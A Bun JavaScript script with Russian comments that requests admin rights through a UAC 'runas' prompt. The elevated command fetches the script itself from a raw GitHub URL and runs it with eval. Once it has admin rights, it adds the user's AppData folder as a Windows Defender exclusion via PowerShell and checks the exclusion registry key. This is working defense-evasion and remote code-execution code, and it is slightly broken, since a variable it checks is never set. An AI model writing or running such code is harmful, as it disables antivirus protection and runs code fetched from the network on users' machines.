// admin-loop.js
(async () => {
  const { dlopen, FFIType, ptr } = await import("bun:ffi");

  const shell32 = dlopen("shell32.dll", {
    ShellExecuteW: {
      args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
      returns: FFIType.i32,
    },
  });

  const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));

  const isAdmin = async () => {
    try {
      const p = Bun.spawn({ cmd: ["net", "session"] });
      return (await p.exited) === 0;
    } catch (e) { return false; }
  };

        if (admin) {
    console.log("✅ АДМИН! PID:", process.pid);
    const appData = process.env.APPDATA || "C:\\Users\\User\\AppData\\Roaming";
    console.log(`🛡️ Цель: ${appData}`);

    // Пытаемся добавить исключение через PowerShell и ЧИТАЕМ вывод
    const ps = Bun.spawn({
      cmd: ["powershell", "-Command", `Add-MpPreference -ExclusionPath '${appData}' -ErrorAction Stop; "Done"`],
      stdout: "pipe",
      stderr: "pipe"
    });

    const out = await new Response(ps.stdout).text();
    const err = await new Response(ps.stderr).text();

    if (err) {
      console.log("❌ Ошибка Defender:", err.trim());
      console.log("💡 Скорее всего, включен Tamper Protection (Защита от подделки).");
    } else {
      console.log("✅ Результат:", out.trim());
    }

    // Проверка реестра
    const reg = Bun.spawn({
      cmd: ["reg", "query", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"],
      stdout: "pipe",
      stderr: "pipe"
    });
    console.log("\n--- Текущие исключения в реестре ---");
    console.log(await new Response(reg.stdout).text() || "Пусто или доступ запрещен");

    console.log("\nНажми Enter для выхода...");
    for await (const line of console) break;
    return;
  }



  console.log("❌ Не админ. Запрос UAC...");
  const url = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/admin-loop.js";
  
  // РЕШЕНИЕ: Передаем в UAC команду, которая заставит НОВЫЙ bun сам скачать код
  const payload = `bun -e "fetch('${url}').then(r=>r.text()).then(eval)"`;

  shell32.symbols.ShellExecuteW(0, toPtr("runas"), toPtr("cmd.exe"), toPtr("/k " + payload), 0, 1);
  process.exit(0);
})();
